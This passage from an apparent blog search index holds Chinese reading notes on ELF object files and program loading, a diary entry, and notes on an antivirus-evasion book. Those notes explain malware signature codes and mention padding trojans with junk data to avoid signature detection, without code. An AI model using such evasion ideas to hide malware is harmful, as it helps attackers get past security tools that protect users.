src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711790679106-5ff94738-11df-4748-823a-200c993159f5.png" alt="img"></p><h2 id="堆的最大申请数量"><a href="#堆的最大申请数量" class="headerlink" title="堆的最大申请数量"></a>堆的最大申请数量</h2><p>自己实验吧hhh，现在是x64时代，可能有时候编译器会自动帮你优化了（或者是其他操作），注意一下。</p><h2 id="段地址对齐"><a href="#段地址对齐" class="headerlink" title="段地址对齐"></a>段地址对齐</h2><p>页是最小以映射单位。对于Intel80x86处理器来说，默认页大小为4096字节。</p><p>我们先拿一个例子来看看：</p><p>如果一个可执行文件有三个段需要装载，分别为SEG0、1、2。</p><p>如果对应起始地址为0x08048000，则如下表6.4</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711790938771-4a77cbef-6482-41fb-a9cd-ea32a021de1f.png" alt="img"></p><p>这里占据了5个页，20480字节，但是三个段总长度才12014字节，利用率才58.6%。</p><p>为了解决这个问题，有些UNIX系统采取了一个取巧的方法，就是让那些各个段接壤部分共享一个物理页面，然后将该物理页面分别映射两次（如下图）</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711791530548-f7a13520-4ffc-4c1d-9da5-8f851589e413.png" alt="img"></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711791431071-84dcbb6e-a141-4557-83f3-832c69b0982c.png" alt="img"></p><p>因为段地址对齐的关系，各个段的虚拟地址就往往不是系统页面长度的整数倍了。</p><h2 id="进程栈初始化"><a href="#进程栈初始化" class="headerlink" title="进程栈初始化"></a>进程栈初始化</h2><p>进程刚开始启动时，需要知道进程的一些运行环境，最基本的就是系统环境变量和进程的运行参数。很常见的一种做法就是将它们保存到栈中。</p><p>假设有如下两个环境变量</p><p>HOME&#x3D;&#x2F;home&#x2F;user</p><p>PATH&#x3D;&#x2F;usr&#x2F;bin</p><p>比如我们运行程序的命令行是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ prog <span class="number">123</span></span><br></pre></td></tr></table></figure><p>假设栈段底部地址为0xBF802000，那么进程初始化后堆栈就如图所示</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711791939688-1b589f7f-e2ed-40c8-88ae-f836d2dc7270.png" alt="img"></p><h1 id="6-5-Linux内核装载ELF过程简介"><a href="#6-5-Linux内核装载ELF过程简介" class="headerlink" title="6.5 Linux内核装载ELF过程简介"></a>6.5 Linux内核装载ELF过程简介</h1><p>当我们在Linux系统的bash输入一个命令执行ELF程序时。</p><p>在用户层面bash进程会调用fork系统调用创建一个新的进程，然后新的进程调用execve()系统调用执行指定的ELF文件，原先的bash进程继续返回等待刚才启动的新进程结束，然后继续等待用户输入命令。</p><p>在内核中，execve系统调用相应的入口是sys_execve()，进行参数检查后会调用do_execve()。</p><p>do_execve()首先会查找被执行的文件，找到文件，则读取文件前128字节（参考ELF结构），这个函数要判断该ELF文件的格式，每种可执行文件的格式的开头几个字节都很特殊，特别是开头四个字节，常被称作魔数</p><ul><li>如果是ELF可执行文件，则头四字节为 0x7f、’e’、’l’、’f’；</li><li>如果是java，则是’c’、’a’、’f’、’e’；</li><li>如果是Shell脚本或者perl、python等，那么其第一行一定是”#&#x2F;bin&#x2F;sh”、”#!&#x2F;usr&#x2F;bin&#x2F;perl”、”#!&#x2F;usr&#x2F;bin&#x2F;python”</li></ul><p>do_execve()检查之后会调用search_binary_handle()去搜索适合的可执行文件装载处理过程。</p><p>比如装载ELF的叫做load_elf_binary()，其有以下五个步骤</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1711792554441-96de7111-a21a-47ce-a996-215cfa2837dd.png" alt="img"></p><p>当其执行完毕后，原路返回。当其又sys_execve()返回用户态时，EIP寄存器直接跳转到ELF程序的入口地址，则ELF可执行文件装载完成。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序员自我修养 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《黑客免杀攻防》第一章 变脸 读书笔记</title>
      <link href="/2024/03/27/%E3%80%8A%E9%BB%91%E5%AE%A2%E5%85%8D%E6%9D%80%E6%94%BB%E9%98%B2%E3%80%8B%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%8F%98%E8%84%B8-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/27/%E3%80%8A%E9%BB%91%E5%AE%A2%E5%85%8D%E6%9D%80%E6%94%BB%E9%98%B2%E3%80%8B%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%8F%98%E8%84%B8-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>2023&#x2F;10&#x2F;11日</p><p>这一章基本做一个介绍，对于一个小白来说，这个介绍写的很好，看了就很吸引人。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>免杀也就是反病毒，反间谍的对立面，可以说是反-反病毒，是一个反杀毒技术。除了使木马免于被查杀外，还可以扩增病毒木马的功能，改变病毒木马的行为。</p><h2 id="免杀技术的简单原理"><a href="#免杀技术的简单原理" class="headerlink" title="免杀技术的简单原理"></a>免杀技术的简单原理</h2><p>最初接触免杀技术，会有特征码在这一概念，作者对于特征码提出了三个问题，笔者认为这有助于我们去思考</p><p>“特征码究竟是什么？”“特征码是如何被定位出来的？”“除此之外，还有什么？”</p><p>免杀源于特征码，杀毒软件也源于特征码</p><p><strong>特征码是什么？</strong></p><p>它是从反病毒领域引进来的一个词，意为病毒或木马所特有的一段二进制码</p><p>反病毒公司的工作人员获得一个病毒样本，最重要的就是提取出特征码。</p><p><strong>那么他是如何找到特征码的呢？</strong></p><p>这里作者举了个特殊例子，我简单说明，就是从危险指令定位特征码，比如格式化所有硬盘指令，一般程序并不会执行这些指令。</p><p>杀毒软件所用的特征码都是复杂的，一般由数段特征片段加上一定逻辑判断机制组合而成。</p><p>当然我们可以有计划的向木马文件中填充垃圾信息，这样不会被定位了。</p><p>这些以后细讲。</p><h2 id="免杀技术和其他技术的区别"><a href="#免杀技术和其他技术的区别" class="headerlink" title="免杀技术和其他技术的区别"></a>免杀技术和其他技术的区别</h2><h3 id="免杀技术不是rootkit技术"><a href="#免杀技术不是rootkit技术" class="headerlink" title="免杀技术不是rootkit技术"></a>免杀技术不是rootkit技术</h3><p>免杀和Rootkit最终目的都是隐藏自己不被其他程序发现。Rootkit的实质是指一组非常直接的工具，免杀只是使用这组工具的方法之一</p><p>其实这里我并没有完全理解，因为我零基础，不了解rootkit技术，到时候回来补充笔记</p><p>现在免杀主要分为三种，其中一种就是行为免杀，也就是通过控制病毒木马的行为来达到躲过杀毒软件主动防御的目的。然后介绍了免杀处理技术和一种Rootkit的关系</p><p>Rootkit并不代表免杀技术，只是构成高级免杀技巧的组成部分。</p><h2 id="免杀不是加密解密技术"><a href="#免杀不是加密解密技术" class="headerlink" title="免杀不是加密解密技术"></a>免杀不是加密解密技术</h2><ul><li>加密解密是针对一个程序展开研究，免杀技术任何时候都是针对两个</li><li>加密解密是以某一程序为媒介所产生的技术对抗（保护者和破译人），免杀是一个程序和另一个程序的技术对抗（杀毒软件和木马）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
            <tag> 黑客免杀攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>碎碎念0x0</title>
      <link href="/2024/03/27/%E7%A2%8E%E7%A2%8E%E5%BF%B50x0/"/>
      <url>/2024/03/27/%E7%A2%8E%E7%A2%8E%E5%BF%B50x0/</url>
      
        <content type="html"><![CDATA[<p>三天感觉浪费了一天半，都是花在游戏上，快睡着前去思考，应不应该？</p><p>玩游戏到底是为了什么？</p><p>周三周四快要晚上的时候，收到好友的邀请一起玩游戏，一起玩会游戏有什么不好？</p><p>但是玩完下线的时候，自己还觉得不够过瘾，周三周四晚上都是这样，所以又多玩到深夜。仔细算了算，这周起码三次熬夜到三点了，</p><p>但是现在才只是周五下午。原本12点停止游戏，1点睡觉，到底是因为什么被打破？这样熬夜下去，感觉做不到的事情越来越多了，首先就是这个东西做不到；其次，熬夜对我来说，等于花费第二天早上的时间，去放纵自己。你真的确定这一天要这样吗？会这样发展成一个星期这样？发展成一个月这样？好好想清楚吧。</p>]]></content>
      
      
      <categories>
          
          <category> 碎碎念 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《程序员自我修养:链接、装载与库》第三章 目标文件有什么？</title>
      <link href="/2024/03/27/%E3%80%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93%E3%80%8B%E7%AC%AC%E4%B8%89%E7%AB%A0-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/27/%E3%80%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93%E3%80%8B%E7%AC%AC%E4%B8%89%E7%AB%A0-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>编译器编译源代码后生成的文件叫做目标文件。</p><h1 id="3-1目标文件的格式"><a href="#3-1目标文件的格式" class="headerlink" title="3.1目标文件的格式"></a>3.1目标文件的格式</h1><p>windows下的可执行格式是PE文件，Linux则是ELF，它们都是COFF格式而来。</p><p>目标文件就是源代码编译后但未进行链接的那些中间文件。</p><p>动态链接库(.ddl)(.so)和静态链接库(.lib)(.a)都按照可执行文件存储。</p><p>静态链接库可理解成多个目标文件捆绑在一起的包。</p><p>下面是ELF文件相关的一个总结图，建议看看。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085119003.jpg"></p><p>随后书下面就讲了一些 目标文件和可执行文件的小历史 这里不做概括</p><p>COFF的主要贡献就是在目标文件中引入了段的机制。</p><h1 id="3-2目标文件是什么样的"><a href="#3-2目标文件是什么样的" class="headerlink" title="3.2目标文件是什么样的?"></a>3.2目标文件是什么样的?</h1><p><strong>目标文件</strong>其实已经是二进制文件了。里面有机器指令代码和数据。</p><p>当然它<strong>还有链接时需要的一些信息，比如符号表，调试信息，字符串等</strong>。</p><p>一般目标文件将这些信息按照不同的属性，<strong>以“节”的形式存储</strong>，有时候也叫做“段”。节与节之间唯一的区别就是ELF的链接视图和装载视图的时候，此处节和段都叫段。</p><p><strong>编译后的机器指令通常放在代码段（.text)，全局变量和局部静态变量放在数据段(.data)。</strong></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085552659.jpg"></p><p>从上图可以看到，<strong>ELF文件开头是“文件头”</strong>，它描述了整个文件的属性（包括是否可执行、静态链接还是动态、入口地址、目标硬件、目标操作系统）<strong>其中还包括一个段表</strong>，<strong>是描述文件中各个段的数组（描述各个段在文件的偏移和属性）。</strong></p><p>值得一提的是，初始化的全局变量和局部静态变量保存在data段；未初始化的全局变量和局部静态变量保存在bss段。但是本来它们应该在data段的，但是因为没初始化，都是0，程序不给存放数据0预留空间，所以此时bss段只是给它们预留位置而已。</p><p>总的来说，程序指令去了text代码段，程序数据去了data和bss段。</p><hr><p>把文件分开来放的好处:</p><ol><li>程序被装载后，数据和指令将分别被映射到两个虚拟内存区域  </li><li>对于CPU来说，它们有着极为强大的缓存体系（有必要提高缓存的命中率）。</li><li>当程序运行多个该程序的副本时，指令只用在一个地方读取，程序的其他数据就可以共享，以用来节省空间。</li></ol><h1 id="3-3挖掘SimpleSection-o"><a href="#3-3挖掘SimpleSection-o" class="headerlink" title="3.3挖掘SimpleSection.o"></a>3.3挖掘SimpleSection.o</h1><p>这里是用readelf来分析文件的格式，笔者只是简单总结一下学到的东西，就不做赘述，建议跟着原文看一遍（P61开始）</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/books_1_3_3.jpg"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -h SimpleSection.o</span><br></pre></td></tr></table></figure><p>-h是把ELF各个段的基本信息打印出来，-x可以把更多信息打印出来。</p><p>这里多了打印出来除了上面提到的段的话，还有三个段(.rodata)只读数据段，(.comment)注释信息段，（.note.GNU-stack）堆栈提示段（此处是0，暂且忽略它）。此ELF文件事实上存在的段就只有text，data，rodata，comment这四个段了。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/ca5b3bcd84d6debdbc422e6c8f3cbcb.png"></p><h2 id="3-3-1-代码段"><a href="#3-3-1-代码段" class="headerlink" title="3.3.1 代码段"></a>3.3.1 代码段</h2><p>主要是对着格式分析,此处不再赘诉</p><h2 id="3-3-2数据段和只读数据段"><a href="#3-3-2数据段和只读数据段" class="headerlink" title="3.3.2数据段和只读数据段"></a>3.3.2数据段和只读数据段</h2><p>主要是对着格式分析,此处不再赘诉</p><hr><p>“rodata”存放只读数据,语义上支持了C++的const关键字，又保证了程序安全性。另外再某些嵌入式平台下，有些存储区域是采用只读存储器的，如ROM，这样将“.rodata”段放在该存储区域中就可以保证程序访问存储器的正确性。</p><p>另外值得一提的是，有时候编译器会把字符串常量放到data段，可以试试把文件名改成.cpp，然后用各种MSVC编译器编译一下</p><p>然后后面根据它展示的内容，小小讲到了大小端序，在本书的附录有详细介绍，到时候去看。</p><h2 id="3-3-3BSS段"><a href="#3-3-3BSS段" class="headerlink" title="3.3.3BSS段"></a>3.3.3BSS段</h2><p>上面说过，bss段存放未初始化的全局变量和局部静态变量。</p><p>通过bss段的符号是否被定义，是否存放在目标文件的BSS段，引出了“弱符号和强符号和common块”这两个概念，在下一章会讨论这个问题。</p><p>编译器优化有时候会给我们分析系统软件背后的机制带来很多在障碍，使很多问题不能够一目了然，本书尽量避开优化过程，还原机制和原理本身</p><h2 id="3-3-4其他段"><a href="#3-3-4其他段" class="headerlink" title="3.3.4其他段"></a>3.3.4其他段</h2><p>这张图片帮忙说了很多，一下子概括了整整一小节的内容，后仅做补充</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085644558.jpg"></p><h3 id="自定义段"><a href="#自定义段" class="headerlink" title="自定义段"></a>自定义段</h3><p>有些时候我们可能希望变量或者某部分代码放到指定的段去，实现某些特定功能。比如为了满足某些硬件的内存和I&#x2F;O地址布局，或者是像Linux操作系统内核中用来完成一些初始化和用户空间复制时出现页错误异常等。</p><p>GCC提供了一个扩展机制，使得程序员可以指定变量所处的段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((section(<span class="string">&quot;FOO&quot;</span>))) <span class="type">int</span> global=<span class="number">42</span></span><br><span class="line">__attribute__((section(<span class="string">&quot;BAR&quot;</span>))) <span class="type">void</span> foo()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在全局变量或者函数之前加入“<strong>attribute</strong>((section(“name”)))”属性，就可以把相应的变量和函数放到以“name”作为段名的段中。</p><h1 id="3-4ELF文件结构描述"><a href="#3-4ELF文件结构描述" class="headerlink" title="3.4ELF文件结构描述"></a>3.4ELF文件结构描述</h1><p>先放ELF文件结构预览图</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085763485.jpg"></p><p>ELF目标文件格式最前面是ELF文件头（包含了整个文件的基本属性，比如ELF文件版本、目标机器型号、程序入口地址等）紧接着是ELF各个段。</p><p><strong>其中与ELF中和段的重要结构就是段表（SHtable），表中描述了（段名，段长度，偏移，读写权限以及其他）段的属性。</strong></p><h2 id="3-4-1文件头"><a href="#3-4-1文件头" class="headerlink" title="3.4.1文件头"></a>3.4.1文件头</h2><p>直接上图</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085850283.jpg"></p><p>ELF文件头定义了ELF魔数、文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、ELF重定位类型、硬件平台、硬件平台版本、入口地址、程序头入口和长度、段表的位置和长度及段的数量等。</p><p>ELF文件头结构以及相关常数被定义在“&#x2F;usr&#x2F;include&#x2F;elf.h”里，<strong>ELF有32和64位的版本。不同版本的成员大小不一样，但是ELF文件头内容基本上一样</strong>，它们文件头分别叫做“Elf32_Ehdr”和“Elf64_Ehdr”。“elf.h”使用typedef定义了一套自己的变量体系。</p><p>一下是Elfxx_Ehdr的结构体图</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085883441.jpg"></p><p>然后较详细介绍了ELF头部结构体一些成员的含义，比如ELF魔数、ELF_type，系统一般通过ELF_type来判断它是ET_REL，ET_EXEC，ET_DYN这三种之一的文件。</p><details class="lake-collapse"><summary id="u4c678d99"><span class="ne-text">ELF头部结构体一些成员的含义</span></summary><p id="u60014499" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085943016.jpg" width="1025" id="u5587b1b1" class="ne-image"></p><p id="ubd04a8f1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730085995128.jpg" width="1006" id="u32a9dd32" class="ne-image"></p></details><h2 id="3-4-2段表"><a href="#3-4-2段表" class="headerlink" title="3.4.2段表"></a>3.4.2段表</h2><p><strong>段表存放段的基本属性的结构</strong>，位置由ELF文件头的“e_shoff”成员决定。</p><p>我们可以看ELF文件段表的基本内容</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730086037825.jpg"></p><p>段表的结构比较简单，它是一个以“Elf32_Shdr”（也叫段描述符）结构体为元素的数组。每个结构体意味着一个段的信息。ELF段表第一个元素是无效的段描述符。</p><p>“Elf32_Shdr”被定义在”&#x2F;usr&#x2F;include&#x2F;elf.h”，如图:</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730086102351.jpg"></p><details class="lake-collapse"><summary id="u86eb7fea"><span class="ne-text">各个成员含义如下</span></summary><p id="u75baa19b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/3ad734d862830a85f303d8c2d7b496e.png" width="576" id="u9500522c" class="ne-image"></p></details><hr><p>这里简单说一下段的标志位，表示该段在进程虚拟地址空间的属性，比如是否可写，是否可执行等。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/a945ceae467dd87f8b4268d7c01942d.png"></p><hr><p>然后再简单说一下段的链接信息(sh_link、sh_info)</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730086244994.jpg"></p><h2 id="3-4-3重定位表"><a href="#3-4-3重定位表" class="headerlink" title="3.4.3重定位表"></a>3.4.3重定位表</h2><p>如果一个段的类型是”SHT_REL”，也就是说它是一个<strong>重定位表</strong>，对于每个需要重定位的段都有一个相应的重定位表</p><p>比如”.rel.text”就是对”.text”的重定位表。此时sh_link表示符号表的下标，sh_info表示它作用域哪个段。</p><p>下一章静态链接过程的时候，再细细分析。</p><h2 id="3-4-4字符串表"><a href="#3-4-4字符串表" class="headerlink" title="3.4.4字符串表"></a>3.4.4字符串表</h2><p>一般字符串表在ELF文件中也以段的形式存储，常见的段名是“.strtab”或者“.shstrtab”。分别代表“字符串表”和“段表字符串表”。</p><h1 id="3-5链接的接口——符号"><a href="#3-5链接的接口——符号" class="headerlink" title="3.5链接的接口——符号"></a>3.5链接的接口——符号</h1><p>在链接中，目标文件的相互拼接实际上是目标文件之间对地址的引用，就是对函数和变量地址的引用，我们将<strong>函数和变量统称为符号</strong>，函数名和变量名就是符号名。</p><p>每个目标文件都有一个相应的符号表(Symbol Table)，每个符号都有一个值，叫符号值，对于函数和变量来说，这就是它们的地址。</p><p>还有几种不常用到的符号：定义在本目标文件的全局符号、段名(它的值就是段的起始地址)、本目标文件引用的全局符号、局部符号、行号信息（目标文件指令和源代码中代码行对应的关系）。</p><h2 id="3-5-1-ELF符号结构"><a href="#3-5-1-ELF符号结构" class="headerlink" title="3.5.1 ELF符号结构"></a>3.5.1 ELF符号结构</h2><p>elf符号表往往是个段，段名“.symtab”。</p><p>符号表结构是一个Elf32_Sym结构的数组</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730086280295.jpg"></p><p>符号绑定st_info，低4位表示符号类型。高28位表示符号绑定信息，有局部，全局符号还有弱引用。</p><p>符号所在段st_shndx，定义在本目标文件中，表示<strong>符号所在段 在段表 中的下标。</strong></p><p><strong>其他详细建议看书</strong></p><h2 id="3-5-2-特殊符号"><a href="#3-5-2-特殊符号" class="headerlink" title="3.5.2 特殊符号"></a>3.5.2 特殊符号</h2><p>使用ld作为链接器来链接生成可执行文件时，它会为我们定义很多特殊符号，这些符号不是我们定义的，但我们可以使用它，这些符号叫做特殊符号。详细看书</p><h2 id="3-5-3-符号修饰和函数签名"><a href="#3-5-3-符号修饰和函数签名" class="headerlink" title="3.5.3 符号修饰和函数签名"></a>3.5.3 符号修饰和函数签名</h2><p>相当于同一个函数名在不同函数位置中，或者不同返回类型，或者我们的一些函数和库重名，会有一些修饰区分它们，大概就是这样，详细看书。</p><h2 id="3-5-4-extern“C”"><a href="#3-5-4-extern“C”" class="headerlink" title="3.5.4 extern“C”"></a>3.5.4 extern“C”</h2><p>c++为了和C兼容，C++有一个声明和定义C符号的关键字“extern”</p><p>详细看书</p><h2 id="3-5-5-弱符号和强符号"><a href="#3-5-5-弱符号和强符号" class="headerlink" title="3.5.5 弱符号和强符号"></a>3.5.5 弱符号和强符号</h2><p>对于C&#x2F;C++语言来说，<strong>编译器默认函数和初始化了的全局变量为强符号，未初始化的全局变量为弱符号。</strong></p><p>也可以用GCC的“<strong>attribute</strong>((weak))”</p><p><strong>注意：强符号和弱符号都是针对定义来说的，不是针对符号的引用</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> ext;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> weak;</span><br><span class="line"><span class="type">int</span> strong = <span class="number">1</span>;</span><br><span class="line">_attribute_((weak)) weak2 = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里，weak和 weak2 是弱符号， strong和 main 是强符号，而ext 既非强符号也非弱符号，因为它只是一个外部变量的引用。</p><details class="lake-collapse"><summary id="u805012ca"><span class="ne-text">针对强弱符号的概念，链接器会按如下规则处理和选择被多次定义的全局不好：</span></summary><ul class="ne-ul" style="margin: 0; padding-left: 23px"><li id="u61fcc03b" data-lake-index-type="0"><span class="ne-text">** 规则1：**不允许强符号被多次定义(即不同的目标文件不能有同名的强符号)；如果有多个强符号定义，则链接器包符号重复定义错误。</span></li><li id="ub79db9da" data-lake-index-type="0"><span class="ne-text">** 规则2：** 如果一个符号在某个目标文件中是强符号，在其他文件中都是弱符号，那么选择强符号。</span></li><li id="u023ddd23" data-lake-index-type="0"><span class="ne-text">** 规则3：** 如果一个符号在所有目标文件中都是弱符号，那么选择其中占用空间最大的一个。</span></li></ul><p id="u2d5f085f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">同样对于符号名的引用也分为强引用和弱引用，强引用表示如果找不到符号定义会报错，弱引用不报错，默认为0或某个特殊值。</span></p><p id="u380c2145" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"><br></span><span class="ne-text">链接：https://www.jianshu.com/p/31108b62f81d</span></p></details><p>同样对于符号名的引用也分为强引用和弱引用，强引用表示如果找不到符号定义会报错，弱引用不报错，默认为0或某个特殊值。</p><h1 id="3-6-调试信息"><a href="#3-6-调试信息" class="headerlink" title="3.6 调试信息"></a>3.6 调试信息</h1><p>如果我们GCC编译的时候加上“-g”参数，编译器产生的目标文件里面加上调试信息，可以用readelf工具查看，目标文件里面多了很多“debug”的段</p><p>我们可以用“strip”命令来去掉ELF的调试信息</p><h1 id="3-7-完"><a href="#3-7-完" class="headerlink" title="3.7 完"></a>3.7 完</h1>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序员自我修养 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
